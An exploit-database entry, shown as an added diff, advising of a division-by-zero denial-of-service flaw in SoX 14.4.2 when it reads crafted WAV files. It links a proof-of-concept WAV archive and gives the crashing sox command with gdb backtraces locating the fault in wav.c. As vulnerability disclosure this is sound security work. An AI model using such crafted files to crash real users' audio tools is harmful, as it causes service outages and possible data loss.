@@ -1,0 +1,85 @@
+id: 38281
+date: 03/22/2023
+title: SoX 14.4.2 - Denial Of Service Vulnerability
+author: LiquidWorm
+cves: 
+
+# Exploit Title: SoX 14.4.2 - Denial Of Service
+# Exploit Author: LiquidWorm
+
+
+Vendor: Chris Bagwell
+Product web page: http://sox.sourceforge.net
+                  https://en.wikipedia.org/wiki/SoX
+Affected version: <=14.4.2
+
+Summary: SoX (Sound eXchange) is the Swiss Army knife of sound processing
+tools: it can convert sound files between many different file formats and
+audio devices, and can apply many sound effects and transformations, as well
+as doing basic analysis and providing input to more capable analysis and
+plotting tools.
+
+Desc: SoX suffers from a division by zero attack when handling WAV files,
+resulting in denial of service vulnerability and possibly loss of data.
+
+Tested on: Ubuntu 18.04.6 LTS
+           Microsoft Windows 10 Home
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2022-5712
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5712.php
+
+CWE ID: 369
+CWE URL: https://cwe.mitre.org/data/definitions/369.html
+
+
+05.09.2022
+
+--
+
+
+PoC:
+
+https://zeroscience.mk/codes/sox_div0.wav.zip
+
+---
+
+$ ./sox div0.wav test.wav reverse
+Floating point exception (core dumped)
+...
+Program received signal SIGFPE, Arithmetic exception.
+0x00005555556a560d in startread (ft=ft@entry=0x5555559a54a0) at wav.c:950
+(gdb) bt
+#0  0x00005555556a560d in startread (ft=ft@entry=0x5555559a54a0) at wav.c:950
+#1  0x000055555558dcc2 in open_read (path=<optimized out>, buffer=<optimized out>, buffer_size=<optimized out>, signal=0x5555559a5140, encoding=<optimized out>, filetype=0x555555777621 "wav")
+    at formats.c:545
+#2  0x0000555555561480 in main (argc=3, argv=0x7fffffffde18) at sox.c:2945
+...
+Program received signal SIGFPE, Arithmetic exception.
+0x00005555556a3a32 in wavwritehdr (second_header=0, ft=0x5555559a6a90) at wav.c:1457
+1457	        blocksWritten = MS_UNSPEC/wBlockAlign;
+(gdb) bt
+#0  0x00005555556a3a32 in wavwritehdr (second_header=0, ft=0x5555559a6a90) at wav.c:1457
+#1  startwrite (ft=0x5555559a6a90) at wav.c:1252
+#2  0x0000555555591669 in open_write (path=<optimized out>, buffer=buffer@entry=0x0, buffer_size=buffer_size@entry=0, buffer_ptr=buffer_ptr@entry=0x0, buffer_size_ptr=buffer_size_ptr@entry=0x0, 
+    signal=<optimized out>, encoding=<optimized out>, filetype=<optimized out>, oob=<optimized out>, overwrite_permitted=<optimized out>) at formats.c:912
+#3  0x0000555555593913 in sox_open_write (path=<optimized out>, signal=<optimized out>, encoding=<optimized out>, filetype=<optimized out>, oob=<optimized out>, overwrite_permitted=<optimized out>)
+    at formats.c:948
+#4  0x000055555556b620 in open_output_file () at sox.c:1557
+#5  process () at sox.c:1754
+#6  main (argc=<optimized out>, argv=<optimized out>) at sox.c:3008
+(gdb) bt full
+#0  0x00005555556a3a32 in wavwritehdr (second_header=0, ft=0x5555559a6a90) at wav.c:1457
+        wFormatTag = 1
+        dwAvgBytesPerSec = 0
+        dwFactSize = 4
+        bytespersample = <optimized out>
+        blocksWritten = <error reading variable blocksWritten (Division by zero)>
+        dwSamplesWritten = 0
+...
+
+#  0day.today [2023-03-27]  #
